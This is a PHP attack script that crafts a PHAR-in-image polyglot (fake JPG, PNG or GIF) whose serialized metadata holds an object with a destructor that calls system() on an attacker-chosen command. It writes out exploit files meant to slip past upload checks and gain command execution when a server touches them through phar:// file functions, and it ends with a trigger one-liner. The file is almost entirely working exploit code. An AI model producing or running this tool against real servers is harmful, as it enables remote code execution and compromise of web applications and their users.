<?php

// Exploit class with __destruct() trigger for system command execution
class EvilPayload {
    public $cmd;

    public function __destruct() {
        system($this->cmd);
    }
}

// Generate minimal valid image data
function getFakeImage($type = 'jpg') {
    switch (strtolower($type)) {
        case 'gif':
            return hex2bin('47494638396101000100800000ffffff00000021f90401000000002c00000000010001000002024401003b'); // 1x1 GIF
        case 'png':
            return hex2bin('89504E470D0A1A0A0000000D49484452000000010000000108060000001F15C4890000000A49444154789C6360000002000152A24F850000000049454E44AE426082'); // 1x1 PNG
        case 'jpg':
        default:
            return hex2bin('FFD8FFE000104A46494600010101004800480000FFDB004300'); // JPEG header
    }
}

// Generate base phar archive with object as metadata
function generate_base_phar($object, $prefix) {
    global $tempname;
    @unlink($tempname);
    $phar = new Phar($tempname);
    $phar->startBuffering();
    $phar->addFromString("test.txt", "test");
    $phar->setStub($prefix . "<?php __HALT_COMPILER(); ?>");
    $phar->setMetadata($object);
    $phar->stopBuffering();
    $content = file_get_contents($tempname);
    @unlink($tempname);
    return $content;
}

// Merge phar into image to create a polyglot file
function generate_polyglot($phar, $image) {
    $phar = substr($phar, 6); // Remove "<?php"
    $len = strlen($phar) + 2;
    $new = substr($image, 0, 2)
        . "\xFF\xFE"
        . chr(($len >> 8) & 0xFF)
        . chr($len & 0xFF)
        . $phar
        . substr($image, 2);

    // Fix tar header checksum
    $contents = substr($new, 0, 148) . "        " . substr($new, 156);
    $chksum = 0;
    for ($i = 0; $i < 512; $i++) {
        $chksum += ord($contents[$i]);
    }
    $oct = sprintf("%07o", $chksum);
    $contents = substr($contents, 0, 148) . $oct . substr($contents, 155);
    return $contents;
}

// CLI check
if (php_sapi_name() !== 'cli') {
    die("Run via CLI: php -c php.ini phar_polyglot.php <command> [jpg|png|gif]\n");
}

if ($argc < 2) {
    die("Usage: php -c php.ini phar_polyglot.php <command> [jpg|png|gif]\n");
}

$command = $argv[1];
$imageType = isset($argv[2]) ? strtolower($argv[2]) : 'jpg';

// File setup
$tempname = 'temp.tar.phar';
$outfile = "exploit.$imageType";
$prefix = '';

// Create the payload object
$object = new EvilPayload();
$object->cmd = $command;

// Generate the polyglot
$imageData = getFakeImage($imageType);
$pharData = generate_base_phar($object, $prefix);
$final = generate_polyglot($pharData, $imageData);

// Save output
file_put_contents($outfile, $final);
echo "[+] Polyglot created: $outfile\n";

// Local test example
echo <<<EOT

[+] To trigger the payload locally:
php -r 'file_exists("phar://$outfile/test.txt");'

EOT;
